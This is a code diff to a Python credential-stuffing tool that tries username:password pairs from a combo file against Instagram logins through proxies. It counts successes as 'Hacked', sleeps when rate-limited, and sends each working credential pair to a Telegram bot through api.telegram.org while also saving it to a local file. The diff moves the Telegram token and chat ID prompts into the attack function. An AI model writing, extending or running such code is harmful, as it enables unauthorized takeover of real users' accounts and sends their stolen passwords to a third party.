@@ -39,6 +39,8 @@ def instagram():
     from datetime import datetime
     r = requests.session()
     print(" la aesta da ba be Proxya ")
+    ID=input("   Your ID Telegram :")
+    token=input("  Token(bot) : ")
     def loopPp():
         global bad, timeout, hacked, checkpoint, error, hits
         combo=input(" [ Path ] File >> ")
@@ -77,15 +79,15 @@ def instagram():
             try:
                 if '"authenticated":false' in login:
                     bad+=1
-                    print(f'\r[-] Hacked : {hits} | [-] checkpoint : {checkpoint} | [-] bad : {bad} | [-] timeout : {timeout} | [-] error : {error}',end="")
+                    print(f'\r[-] Hacked : {hits} | [-] checkpoint : {checkpoint} | [-] bad : {bad} | [-] timeout : {timeout} | [-] error : {error}',end='')
                 elif '"message":"Please wait a few minutes before you try again."' in login:
                     timeout+=1
                     import time
-                    print(f"\r[-] Hacked : {hits} | [-] checkpoint : {checkpoint} | [-] bad : {bad} | [-] timeout : {timeout} | [-] error : {error}",end="")
+                    print(f'\r[-] Hacked : {hits} | [-] checkpoint : {checkpoint} | [-] bad : {bad} | [-] timeout : {timeout} | [-] error : {error}',end='')
                     time.sleep(309)
                 elif 'userId' in login:
                     hits+=1
-                    print(f"\r[-] Hacked : {hits} | [-] checkpoint : {checkpoint} | [-] bad : {bad} | [-] timeout : {timeout} | [-] error : {error}",end="")
+                    print(f'\r[-] Hacked : {hits} | [-] checkpoint : {checkpoint} | [-] bad : {bad} | [-] timeout : {timeout} | [-] error : {error}',end='')
                     boooom=f"\nuser&num&emil: "+user+":"+pasw
                     r.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={boooom}\n')
                     with open('Good(instgram).txt', 'a') as ff:
@@ -136,8 +138,6 @@ def dwbara():
     '''
     print(logo)
     i=input("   Choese: ")
-    ID=input("   Your ID Telegram :")
-    token=input("  Token(bot) : ")
     if i=="1":
         instagram()
     elif i=="0":
